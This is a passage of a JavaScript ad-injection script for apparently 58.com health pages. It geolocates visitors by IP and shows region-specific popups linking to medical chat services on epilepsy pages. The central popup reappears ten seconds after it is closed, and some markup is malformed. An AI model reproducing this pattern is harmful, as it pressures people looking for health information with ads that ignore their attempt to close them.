				'<!--中间弹窗-->',
				'  <div id="<!--uuid-->_3" style="width: 495px; _width:650px; height:330px; _height:430px; overflow:hidden; position:relative; z-index: 900;">',
				'<div style="position:absolute; top:0px; _top:100px; left:0px; _left:140px; z-index:903;"> <a href="<!--webim-->" target="_blank"><img border="0" src="<!--img1-->"></a> </div>',
				'    <div style="position:absolute; top:0px; _top:100px; left:410px; _left:612px; z-index:904;"> <a name="close" href="javascript:;"><img src="http://www.dxjk120.com/images/closebtn.gif" border="0"></a> </div>',
				'  </div>',
			
				'<!--底部QQ弹窗-->',
				'<div id="<!--uuid-->_5" style="width:218px;">',
				'  <div style="width: 214px; height: 124px;"> <img src="http://js.ufstone.net/images/www58dx_tc.jpg" border="0" usemap="#winMap" id="win" style="position: relative; border: 0px; z-index: 100; top: 0px; left: 0px;">',
				'    <map name="winMap" id="winMap">',
				'      <area name="close" rea shape="rect" coords="177,3,215,21" href="javascript:;">',
				'      <area target="_blank" rea shape="rect" coords="4,31,210,115" href="<!--webim-->">',
				'    </map>',
				'  </div>',
				'</div>'].join("");
				var div=document.createElement('div')
				,	uuid=$G.uuidFast().replace(/-/ig,'')
				;
				html=$G.Config.wmReplace(html,'<!--uuid-->',uuid);
				$G.Each(function(i,k){
					html=$G.Config.wmReplace(html,'<!--'+k+'-->',this+'');
				},d[cn]);
				div.innerHTML=html;
				document.body.appendChild(div);
				
				var int1={
						position:'fixed',
						isTop:true,
						isLeft:true
					}
				,	int2={
						position:'fixed',
						isTop:true,
						isRight:true
					}
				,	int3={
						position:'fixed',
						isCenter:true
					}
				,	int4={
						position:'fixed',
						isBottom:true,
						isLeft:true
					}
				,	int5={
						position:'fixed',
						isBottom:true,
						isRight:true
					}
				;
				
				var domDiv1=$G('#'+uuid+'_1',div);
				domDiv1.WinAlt(int1);
				$G('.close',domDiv1[0]).click(function(){
					domDiv1.display().none();
				});
				var domDiv2=$G('#'+uuid+'_2',div);
				domDiv2.WinAlt(int2);
				$G('.close',domDiv2[0]).click(function(){
					domDiv2.display().none();
				});
				var domDiv3=$G('#'+uuid+'_3',div);
				domDiv3.WinAlt(int3);
				$G('.close',domDiv3[0]).click(function(){
					domDiv3.display().none();
					var stime = setInterval(function(){
							domDiv3.display().block();
							clearTimeout(stime);
					},10000);
				});
				var domDiv4=$G('#'+uuid+'_4',div);
				domDiv4.WinAlt(int4);
				$G('.close',domDiv4[0]).click(function(){
					domDiv4.display().none();
				});
				var domDiv5=$G('#'+uuid+'_5',div);
				domDiv5.WinAlt(int5);
				$G('.close',domDiv5[0]).click(function(){
					domDiv5.display().none();
				});
				var eff=new $G.eff(domDiv5);
				eff.shake();
			};
			var dxFn=function(){
				$G.getjs({url:'http://pv.sohu.com/cityjson?ie=utf-8'});
				loadFn(function(){
					try{
						var cname=returnCitySN['cname']||'';
						if(cname){
							if(cname.indexOf("陕西")>-1){
								dxShow('陕西');
							}else if(cname.indexOf("甘肃")>-1){
								dxShow('陕西');
							}else if(cname.indexOf("宁夏")>-1){
								dxShow('陕西');
							}else if(cname.indexOf("青海")>-1){
								dxShow('陕西');
							}else if(cname.indexOf("广东")>-1){
								dxShow('广东');
							}else if(cname.indexOf("广西")>-1){
								dxShow('广东');
							}else if(cname.indexOf("黑龙江")>-1){
								dxShow('黑龙江');
							}else if(cname.indexOf("云南")>-1){
								dxShow('云南');
							}else if(cname.indexOf("贵州")>-1){
								dxShow('云南');
							}else if(cname.indexOf("上海")>-1){
								dxShow('上海');
							}else if(cname.indexOf("海南")>-1){
								dxShow('上海');
							}else if(cname.indexOf("福建")>-1){
								dxShow('上海');
							}else if(cname.indexOf("北京")>-1){
								dxShow('北京');
							}else{
								dxShow('其他');
							}
						}
					}catch(e){
					}
					
				},function(){
					if((typeof returnCitySN)=='object'){
						return true;
					}else
						return false;
				});
			};
			
			var dxMShow=function(cn,o){
				o=o||{};
				var d={};
				d['西安']={
				'img1':'http://js.ufstone.net/images/www58dx_tc.jpg'//中间
				,	'img3':'http://xakj.913wen.com/images/swt1.gif'//左	
				,	'webim':'http://dlt.zoosnet.net/LR/Chatpre.aspx?id=DLT87827839&lng=cn&e=lc-hmt-85&r=lc-hmt-85&p=lc-hmt-85'
				};
				d['云南']={
					'img1':'http://js.ufstone.net/images/www58dx_tc.jpg'//中间
				,	'img3':'http://xakj.913wen.com/images/swt1.gif'//左	
		
				,	'webim':'http://dat.zoosnet.net/LR/Chatpre.aspx?id=DAT50342982&lng=cn&e=lc-hmt-dx-85&r=lc-hmt-dx-85&p=lc-hmt-dx-85'
				};
				d['黑龙江']={
					'img1':'http://js.ufstone.net/images/www58dx_tc.jpg'//中间
				,	'img3':'http://xakj.913wen.com/images/swt1.gif'//左	
		
				,	'webim':'http://dgt.zoosnet.net/LR/Chatpre.aspx?id=DGT82181361&lng=cn&e=lc-hmt-85&r=lc-hmt-85&p=lc-hmt-85'
				};
				d['广东']={
					'img1':'http://js.ufstone.net/images/www58dx_tc.jpg'//中间
				,	'img3':'http://xakj.913wen.com/images/swt1.gif'//左	
		
				,	'webim':'http://det.zoosnet.net/LR/Chatpre.aspx?id=DET27952501&e=lc_gzdx(2bu)+w&r=lc_gzdx(2bu)+w&p=lc_gzdx(2bu)+w'
				};
				d['上海']={
					'img1':'http://js.ufstone.net/images/www58dx_tc.jpg'//中间
				,	'img3':'http://xakj.913wen.com/images/swt1.gif'//左	
		
				,	'webim':'http://phw.twos.net.cn/LR/Chatpre.aspx?id=phw28129993&lng=cn&r=lc(2bu)+w&p=lc(2bu)+w&e=lc(2bu)+w'
				};
				d['北京']={
					'img1':'http://js.ufstone.net/images/www58dx_tc.jpg'//中间
				,	'img3':'http://xakj.913wen.com/images/swt1.gif'//左	
		
				,	'webim':''
				};
				d['其他']={
					'img1':'http://js.ufstone.net/images/www58dx_tc.jpg'//中间
				,	'img3':'http://xakj.913wen.com/images/swt1.gif'//左	
		
				,	'webim':'http://phw.twos.net.cn/LR/Chatpre.aspx?id=phw28129993&lng=cn&r=lc(2bu)+w&p=lc(2bu)+w&e=lc(2bu)+w'
				};
				var html=['<!--左弹窗-->',
				'<div id="<!--uuid-->_1" style="left: 2px; position: absolute; top: 200px; width: 165px; height: 440px;"> <a target="_blank"  href="<!--webim-->"> <img src="<!--img3-->" width="50" height="150"> </a> </div>',
				
				'<!--中间弹窗-->',
				'  <div id="<!--uuid-->_3" style="width: 240px; _width:240px; height:120px; _height:120px; overflow:hidden; position:relative; z-index: 900;">',
				'<div style="position:absolute; top:0px; _top:100px; left:0px; _left:140px; z-index:903;"> <a href="<!--webim-->" target="_blank"><img border="0" src="<!--img1-->"></a> </div>',
				'    <div style="position:absolute; top:0px; _top:100px; left:190px; _left:612px; z-index:904;"> <a name="close" href="javascript:;"><img src="http://www.dxjk120.com/images/closebtn.gif" border="0"></a> </div>',
				'  </div>',
			
		
				'    <map name="winMap" id="winMap">',
				'      <a name="close" rea shape="rect" coords="177,3,215,21" href="javascript:;">',
				'      <a target="_blank" rea shape="rect" coords="4,31,210,115" href="<!--webim-->">',
				'    </map>',
				'  </div>',
				'</div>'].join("");
				var div=document.createElement('div')
				,	uuid=$G.uuidFast().replace(/-/ig,'')
				;
				html=$G.Config.wmReplace(html,'<!--uuid-->',uuid);
				$G.Each(function(i,k){
					html=$G.Config.wmReplace(html,'<!--'+k+'-->',this+'');
				},d[cn]);
				div.innerHTML=html;
				document.body.appendChild(div);
				
				var int1={
						position:'fixed',
						isTop:true,
						isLeft:true
					}
				,	int2={
						position:'fixed',
						isTop:true,
						isRight:true
					}
				,	int3={
						position:'fixed',
						isCenter:true
					}
				,	int4={
						position:'fixed',
						isBottom:true,
						isLeft:true
					}
				,	int5={
						position:'fixed',
						isBottom:true,
						isRight:true
					}
				;
				var domDiv1=$G('#'+uuid+'_1',div);
				domDiv1.WinAlt(int1);
				$G('.close',domDiv1[0]).click(function(){
					domDiv1.display().none();
				});
				/*var domDiv2=$G('#'+uuid+'_2',div);
				domDiv2.WinAlt(int2);
				$G('.close',domDiv2[0]).click(function(){
					domDiv2.display().none();
				});*/
				var domDiv3=$G('#'+uuid+'_3',div);
				domDiv3.WinAlt(int5);
				$G('.close',domDiv3[0]).click(function(){
					domDiv3.display().none();
					var stime = setInterval(function(){
							domDiv3.display().block();
							clearTimeout(stime);
					},10000);
				});
				var eff=new $G.eff(domDiv3);
				eff.shake();
				/*var domDiv4=$G('#'+uuid+'_4',div);
				domDiv4.WinAlt(int4);
				$G('.close',domDiv4[0]).click(function(){
					domDiv4.display().none();
				});
				var domDiv5=$G('#'+uuid+'_5',div);
				var dd5Dom=domDiv5.WinAlt(int5);
				$G('.close',domDiv5[0]).click(function(){
					domDiv5.display().none();
				});
				var eff=new $G.eff($G('#'+uuid+'_5',div));
				eff.shake();*/
			};
			var dxMFn=function(){
				$G.getjs({url:'http://pv.sohu.com/cityjson?ie=utf-8'});
				loadFn(function(){
					try{
						var cname=returnCitySN['cname']||'';
						if(cname){
							if(cname.indexOf("陕西")>-1){
								dxMShow('陕西');
							}else if(cname.indexOf("甘肃")>-1){
								dxMShow('陕西');
							}else if(cname.indexOf("宁夏")>-1){
								dxMShow('陕西');
							}else if(cname.indexOf("青海")>-1){
								dxMShow('陕西');
							}else if(cname.indexOf("广东")>-1){
								dxMShow('广东');
							}else if(cname.indexOf("广西")>-1){
								dxMShow('广东');
							}else if(cname.indexOf("黑龙江")>-1){
								dxMShow('黑龙江');
							}else if(cname.indexOf("云南")>-1){
								dxMShow('云南');
							}else if(cname.indexOf("贵州")>-1){
								dxMShow('云南');
							}else if(cname.indexOf("上海")>-1){
								dxMShow('上海');
							}else if(cname.indexOf("海南")>-1){
								dxMShow('上海');
							}else if(cname.indexOf("福建")>-1){
								dxMShow('上海');
							}else if(cname.indexOf("北京")>-1){
								dxMShow('北京');
							}else{
								dxMShow('其他');
							}
						}
					}catch(e){
					}
					
				},function(){
					if((typeof returnCitySN)=='object'){
						return true;
					}else
						return false;
				});
			};
		
			var xbShow=function(cn,o){
				o=o||{};
				var d={};
				d['陕西']={
					'img1':'http://js.ufstone.net/images/xbswt.gif'//中间
				,	'webim':'http://lzt.zoossoft.net/LR/chatwin.aspx?id=LZT36568760&lng=cn&p=mmc2015&e=mmc2015&r=mmc2015'
				};
				d['其他']={
					'img1':'http://js.ufstone.net/images/xbswt.gif'
				,	'webim':'http://lzt.zoossoft.net/LR/chatwin.aspx?id=LZT36568760&lng=cn&p=mmc2015&e=mmc2015&r=mmc2015'
				};
				var html=['<!--左弹窗-->',
		
				'<!--中间弹窗-->',
				'  <div id="<!--uuid-->_3" style="width: 495px; _width:650px; height:330px; _height:430px; overflow:hidden; position:relative; z-index: 900;">',
				'<div style="position:absolute; top:0px; _top:100px; left:0px; _left:140px; z-index:903;"> <a href="<!--webim-->" target="_blank"><img border="0" src="<!--img1-->"></a> </div>',
				'    <div style="position:absolute; top:0px; _top:100px; left:410px; _left:612px; z-index:904;"> <a name="close" href="javascript:;"><img src="http://www.dxjk120.com/images/closebtn.gif" border="0"></a> </div>',
				'  </div>',
			
				'<!--底部QQ弹窗-->',
				'<div id="<!--uuid-->_5" style="width:218px;">',
				'  <div style="width: 214px; height: 124px;"> <img src="http://js.ufstone.net/images/xb214.jpg" border="0" usemap="#winMap" id="win" style="position: relative; border: 0px; z-index: 100; top: 0px; left: 0px;">',
				'    <map name="winMap" id="winMap">',
				'      <area name="close" rea shape="rect" coords="177,3,215,21" href="javascript:;">',
				'      <area target="_blank" rea shape="rect" coords="4,31,210,115" href="<!--webim-->">',
				'    </map>',
				'  </div>',
				'</div>'].join("");
				var div=document.createElement('div')
				,	uuid=$G.uuidFast().replace(/-/ig,'')
				;
				html=$G.Config.wmReplace(html,'<!--uuid-->',uuid);
				$G.Each(function(i,k){
					html=$G.Config.wmReplace(html,'<!--'+k+'-->',this+'');
				},d[cn]);
				div.innerHTML=html;
				document.body.appendChild(div);
				
				var int1={
						position:'fixed',
						isTop:true,
						isLeft:true
					}
				,	int2={
						position:'fixed',
						isTop:true,
						isRight:true
					}
				,	int3={
						position:'fixed',
						isCenter:true
					}
				,	int4={
						position:'fixed',
						isBottom:true,
						isLeft:true
					}
				,	int5={
						position:'fixed',
						isBottom:true,
						isRight:true
					}
				;
				
				var domDiv1=$G('#'+uuid+'_1',div);
				domDiv1.WinAlt(int1);
				$G('.close',domDiv1[0]).click(function(){
					domDiv1.display().none();
				});
				var domDiv2=$G('#'+uuid+'_2',div);
				domDiv2.WinAlt(int2);
				$G('.close',domDiv2[0]).click(function(){
					domDiv2.display().none();
				});
				var domDiv3=$G('#'+uuid+'_3',div);
				domDiv3.WinAlt(int3);
				$G('.close',domDiv3[0]).click(function(){
					domDiv3.display().none();
					var stime = setInterval(function(){
							domDiv3.display().block();
							clearTimeout(stime);
					},10000);
				});
				var domDiv4=$G('#'+uuid+'_4',div);
				domDiv4.WinAlt(int4);
				$G('.close',domDiv4[0]).click(function(){
					domDiv4.display().none();
				});
				var domDiv5=$G('#'+uuid+'_5',div);
				domDiv5.WinAlt(int5);
				$G('.close',domDiv5[0]).click(function(){
					domDiv5.display().none();
				});
				var eff=new $G.eff(domDiv5);
				eff.shake();
			};
			var xbFn=function(){
				$G.getjs({url:'http://pv.sohu.com/cityjson?ie=utf-8'});
				loadFn(function(){
					try{
						var cname=returnCitySN['cname']||'';
						if(cname){
							if(cname.indexOf("陕西")>-1){
								xbShow('陕西');
							}else{
								xbShow('其他');
							}
						}
					}catch(e){
					}
					
				},function(){
					if((typeof returnCitySN)=='object'){
						return true;
					}else
						return false;
				});
			};
			
			var sbMShow=function(cn,o){
				o=o||{};
				var d={};
				d['陕西']={
				'img1':'http://js.ufstone.net/images/xb214.jpg'//中间
				,	'img3':'http://xakj.913wen.com/images/swt1.gif'//左	
				,	'webim':'http://lzt.zoossoft.net/LR/chatwin.aspx?id=LZT36568760&lng=cn&p=mmc2015&e=mmc2015&r=mmc2015'
				};
				d['其他']={
					'img1':'http://js.ufstone.net/images/xb214.jpg'//中间
				,	'img3':'http://xakj.913wen.com/images/swt1.gif'//左	
		
				,	'webim':'http://lzt.zoossoft.net/LR/chatwin.aspx?id=LZT36568760&lng=cn&p=mmc2015&e=mmc2015&r=mmc2015'
				};
				var html=['<!--左弹窗-->',
				'<div id="<!--uuid-->_1" style="left: 2px; position: absolute; top: 200px; width: 165px; height: 440px;"> <a target="_blank"  href="<!--webim-->"> <img src="<!--img3-->" width="50" height="150"> </a> </div>',
				
				'<!--中间弹窗-->',
				'  <div id="<!--uuid-->_3" style="width: 240px; _width:240px; height:120px; _height:120px; overflow:hidden; position:relative; z-index: 900;">',
				'<div style="position:absolute; top:0px; _top:100px; left:0px; _left:140px; z-index:903;"> <a href="<!--webim-->" target="_blank"><img border="0" src="<!--img1-->"></a> </div>',
				'    <div style="position:absolute; top:0px; _top:100px; left:190px; _left:612px; z-index:904;"> <a name="close" href="javascript:;"><img src="http://www.dxjk120.com/images/closebtn.gif" border="0"></a> </div>',
				'  </div>',
			
		
				'    <map name="winMap" id="winMap">',
				'      <a name="close" rea shape="rect" coords="177,3,215,21" href="javascript:;">',
				'      <a target="_blank" rea shape="rect" coords="4,31,210,115" href="<!--webim-->">',
				'    </map>',
				'  </div>',
				'</div>'].join("");
				var div=document.createElement('div')
				,	uuid=$G.uuidFast().replace(/-/ig,'')
				;
				html=$G.Config.wmReplace(html,'<!--uuid-->',uuid);
				$G.Each(function(i,k){
					html=$G.Config.wmReplace(html,'<!--'+k+'-->',this+'');
				},d[cn]);
				div.innerHTML=html;
				document.body.appendChild(div);
				
				var int1={
						position:'fixed',
						isTop:true,
						isLeft:true
					}
				,	int2={
						position:'fixed',
						isTop:true,
						isRight:true
					}
				,	int3={
						position:'fixed',
						isCenter:true
					}
				,	int4={
						position:'fixed',
						isBottom:true,
						isLeft:true
					}
				,	int5={
						position:'fixed',
						isBottom:true,
						isRight:true
					}
				;
		
			};
			var xbMFn=function(){
				$G.getjs({url:'http://pv.sohu.com/cityjson?ie=utf-8'});
				loadFn(function(){
					try{
						var cname=returnCitySN['cname']||'';
						if(cname){
							if(cname.indexOf("陕西")>-1){
								sbMShow('陕西');
							}else{
								sbMShow('其他');
							}
						}
					}catch(e){
					}
					
				},function(){
					if((typeof returnCitySN)=='object'){
						return true;
					}else
						return false;
				});
			};
		var mCabin='TS2GGGIIF40620,TS21OJLBANES1M,TS2BF3I5KH6435,TS240RFSICNA1G,TS2L0BBB77BK1A';
		$G.wm({
			cabin:mCabin 	//广告位标识
		,	style:'m.58.com'//页面标识广告以哪种风格显示，便于日志数据分析
		,	device:1
		,	fn:function(d){
				/****以下为封闭好后的广告JSON对象数据.		注：每一条广告数据，执行一次此方法****/
				/*	
					cabin:广告标识
					type:广告类型
					index:索引
				*/
				this.eachFn=textFn;
			}
		,	callbackEach:function(n){
				$G('.HAOMEITList').Each(function(){
					if(n>0)
						this.style.display='';
					else
						this.style.display='none';
				});
				//右侧是否显示 名称跟据页面标识可自己换.代表name #代表ID
				$G('.HAOMEITList_1').Each(function(){
					if(n>3)
						this.style.display='';
					else
						this.style.display='none';
				});
				var sosuo=''
				,	uuid=$G.uuidFast().replace(/-/ig,'')
				;
				var lurl=window.document.location+'';
				var arrayUrl=lurl.split('/');
				if(arrayUrl.length>1)
					sosuo=arrayUrl[arrayUrl.length-2];
				window['set'+uuid]=function(o){
					if(!sosuo)return;
					o=o||{data:''};
					var htmls="";
					if(o.data===false){
						return;
					}
					$G.Each(function(){
						htmls+=['<li><a href="">',
'  <div class="tel_ico_cn" title="'+this.content+'"> </div>',
'  </a><a href="'+this.url+'">',
'  <dl>',
'    <dt class="tit"><strong class="nt">'+this.content+'</strong></dt>',
'  </dl>',
'  </a></li>'].join("");
					},o.data);
					var listInfo=$G('ul:list-info')[0]
					//,	htmlend=listInfo[0].innerHTML
					;
					var div = document.createElement('div');
					div.innerHTML = htmls;
					div.style.cssText='padding: 10px; border-bottom: 1px solid rgb(227, 227, 227);';
					listInfo.insertBefore(div,listInfo.childNodes[0]);
				};
				getjs({url:'http://jiankang.58.com/wenda/touch/getdepartquestion?departname='+sosuo+'&cb=window.set'+uuid});
				
				var metaKey=$G('.keywords .Keywords')
				,	v=''
				;
				metaKey.Each(function(){
					v+=$G(this).getAtt('content');
				});
				if(v.indexOf('癫痫')>=0){
					if($G.mobile){
						dxMFn();
					}else{
						dxFn();
					}
				}else if(v.indexOf('尖锐湿疣')>=0||v.indexOf('性病')>=0||v.indexOf('疱疹')>=0){
					/*if($G.mobile){
						xbMFn();
					}else{
						xbFn();
					}*/
				}
			}
		});
		/*************文字广告	结束*******************/
		var mListDom=$G((','+mCabin).replace(/,/ig,' .'));
		mListDom.Each(function(){
			this.style.cssText='padding:10px;border-bottom:1px solid #e3e3e3';
		});
	};
	/******************************************************************
	公共类初始化结束后执行方法	结束
	*******************************************************************/
	//执行无限加载公共类 必须在回调方法之下，请注意执行顺序
	getjs({url:'http://static.adx.haomeit.com/js/Glacier.js'});
})();
